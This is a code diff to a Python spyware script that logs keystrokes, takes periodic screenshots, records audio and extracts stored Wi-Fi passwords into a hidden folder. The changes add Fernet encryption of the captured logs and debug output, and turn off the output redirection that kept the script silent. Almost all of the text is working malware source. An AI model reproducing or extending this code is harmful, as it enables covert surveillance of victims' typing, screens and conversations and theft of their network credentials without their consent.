@@ -8,6 +8,8 @@ import os
 import sys
 from pynput import keyboard  # type: ignore
 from PIL import ImageGrab
+from cryptography.fernet import Fernet
+
 
 # Creating log directory
 log_dir = "/Users/mannatvirk/.hiddenfolder"
@@ -26,6 +28,18 @@ operation_logger.setLevel(logging.INFO)
 operation_handler = logging.FileHandler(os.path.join(log_dir, "log.txt"))
 operation_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
 operation_logger.addHandler(operation_handler)
+
+# generating key for encryption and decryption 
+key_file = os.path.join(log_dir, "encryption_key.key")
+if not os.path.exists(key_file):
+    key = Fernet.generate_key()
+    with open(key_file, "wb") as f:
+        f.write(key)
+else:
+    with open(key_file, "rb") as f:
+        key = f.read()
+
+cipher = Fernet(key)
 
 # SSID to account mapping for 802.1X networks
 ssid_to_account = {
@@ -108,28 +122,87 @@ def get_wifi_password(ssid):
     except Exception as e:
         logging.info(f"Unexpected error: {e}")
 
+def encrypt_file(filepath):
+    print(f"Checking if {filepath} exists...")
+    try:
+        if os.path.exists(filepath):
+            print(f"Encrypting {filepath}...")  # debug
+            with open(filepath, "rb") as f:
+                file_data = f.read()
+                if not file_data:
+                    operation_logger.info(f"File {filepath} is empty and will not be encrypted.")
+                    print(f"File {filepath} is empty; skipping encryption.")  # debug
+                    return
+            encrypted_data = cipher.encrypt(file_data)
+            with open(filepath, "wb") as f:
+                f.write(encrypted_data)
+            operation_logger.info(f"Encrypted {filepath} successfully.")
+            print(f"Encryption of {filepath} completed.")  # debuh
+        else:
+            operation_logger.info(f"File {filepath} does not exist.")
+            print(f"File {filepath} does not exist.")  # debug
+    except Exception as e:
+        operation_logger.info(f"Error encrypting {filepath}: {e}")
+        print(f"Error encrypting {filepath}: {e}")  # debug
+
+def decrypt_file(filepath):
+    try:
+        if os.path.exists(filepath):
+            print(f"Decrypting {filepath}...")  # Debug statement
+            with open(filepath, "rb") as f:
+                encrypted_data = f.read()
+            decrypted_data = cipher.decrypt(encrypted_data)
+            with open(filepath, "wb") as f:
+                f.write(decrypted_data)
+            operation_logger.info(f"Decrypted {filepath} successfully.")
+            print(f"Decryption of {filepath} completed.")  # Debug statement
+        else:
+            operation_logger.info(f"File {filepath} does not exist.")
+            print(f"File {filepath} does not exist.")  # Debug statement
+    except Exception as e:
+        operation_logger.info(f"Error decrypting {filepath}: {e}")
+        print(f"Error decrypting {filepath}: {e}")  # Debug statement
+
+
 if __name__ == "__main__":
-    sys.stdout = open(os.devnull, 'w')
-    sys.stderr = open(os.devnull, 'w')
+    print("Starting main execution...")
+    
+    # Commenting out redirection for debugging
+    # sys.stdout = open(os.devnull, 'w')
+    # sys.stderr = open(os.devnull, 'w')
 
     screenshot_thread = threading.Thread(target=periodic_screenshots, args=(10,), daemon=True)
     screenshot_thread.start()
+
+    print("Started screenshot thread.")
 
     audio_filename = os.path.join(log_dir, "audio_rec.wav")
     recording_duration = 300  
     audio_thread = threading.Thread(target=record_audio, args=(audio_filename, recording_duration), daemon=True)
     audio_thread.start()
 
-    current_ssid = get_current_wifi_ssid()
+    print("Started audio recording thread.")
 
+    current_ssid = get_current_wifi_ssid()
     if current_ssid:
+        print(f"Current SSID: {current_ssid}")
         get_wifi_password(current_ssid)
     else:
+        print("No connected Wi-Fi network found.")
         logging.info("No connected Wi-Fi network found.")
 
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
-
+    print("Keylogger started.")
+    
     listener.join()
+    print("Keylogger stopped.")
 
-# do encryption next
+    log_file_path = os.path.join(log_dir, "log.txt")
+    keylog_file_path = os.path.join(log_dir, "keylog.txt")
+    
+    print("Encrypting log files...")
+    encrypt_file(log_file_path)
+    encrypt_file(keylog_file_path)
+
+    print("Finished encryption process.")
